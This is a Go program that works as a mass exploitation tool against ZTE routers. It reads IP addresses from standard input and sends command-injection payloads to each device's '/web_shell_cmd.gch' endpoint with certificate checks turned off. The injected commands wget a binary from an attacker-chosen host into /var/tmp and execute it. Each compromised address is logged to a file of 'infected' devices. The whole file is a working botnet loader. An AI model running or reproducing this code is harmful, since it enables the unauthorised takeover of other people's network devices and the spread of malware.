// Created By Merlyn
// go build -o zte3 zteV3.go
package main

import (
    "bufio"
    "bytes"
    "crypto/tls"
    "fmt"
    "net/http"
    "os"
    "strings"
    "sync"
    "time"
)

// Configuration for payload2
var (
    ip2      = "" // IP address for payload2
    filename = "" // Filename for payload2 Bin
)

// Payloads
var (
    payload  = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Finit.norm&CmdAck=")
    payload3 = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Finit.norm+zteV3&CmdAck=")
)

var wg sync.WaitGroup

func work(ip string) {
    defer wg.Done()

    ip = strings.TrimRight(ip, "\r\n")
    fmt.Printf("[ZTEV3]---> %s\n", ip)

    url := "https://" + ip + "/web_shell_cmd.gch"
    tr := &http.Transport{
        ResponseHeaderTimeout: 5 * time.Second,
        DisableCompression:    true,
        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr, Timeout: 5 * time.Second}

    postRequest := func(payload []byte) {
        _, err := client.Post(url, "text/plain", bytes.NewBuffer(payload))
        if err != nil {
            // fmt.Printf("Failed to send HTTP request to %s: %v\n", ip, err)
        }
    }

    // Configuration for payload2
    payload2 := []byte(fmt.Sprintf("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http://%s/bins/%s+-O+/var/tmp/init.norm&CmdAck=", ip2, filename))
    postRequest(payload2)

    // Post payload 3
    postRequest(payload3)

    // Log infected devices
    logInfected(ip)
}

func logInfected(ip string) {
    f, err := os.OpenFile("ZTEV3Infected.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Printf("Error opening file: %v\n", err)
        return
    }
    defer f.Close()

    if _, err := f.WriteString(ip + "\n"); err != nil {
        fmt.Printf("Error writing to file: %v\n", err)
    }
}

func main() {
    for {
        // Read input from standard input
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            ip := scan.Text()
            wg.Add(1)
            go work(ip)
            time.Sleep(2 * time.Millisecond)
        }
    }
}